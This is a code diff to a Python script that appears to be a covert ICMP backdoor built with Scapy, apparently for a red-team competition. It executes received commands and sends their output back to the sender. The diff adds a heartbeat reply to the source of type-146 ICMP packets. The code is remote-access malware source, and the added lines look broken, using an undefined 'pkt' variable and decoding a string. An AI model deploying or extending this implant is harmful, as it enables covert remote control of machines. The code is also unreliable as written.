@@ -27,6 +27,9 @@ def cmd_proc(typ, code, source):
         if result.check_returncode() is None and verbose:
             print(result.stdout.decode())
         send_output(result.stdout.decode(), source)
+    elif typ == 146:
+        sendbk = pkt.getlayer(IP).src.decode()
+        heart(sendbk, 146)
 
 def breakup(data):
     broken = []
@@ -41,13 +44,10 @@ def send_output(stdout, sender):
 """ May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
 Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
 """
-def heart():
-    n = 1
+def heart(dest, protype):
     print("TheLoaded RICK")
     #while True:
-    send(IP(dst="127.0.0.1")/ ICMP(type=) / "test")
-    print("BEAT" + str(n))
-    n += 1
+    send(IP(dst=dest)/ICMP(type=protype, code=1)/"abcdefghijklmnopqrstuvwxyz")
     #time.sleep(15)
 
 def sniffer():
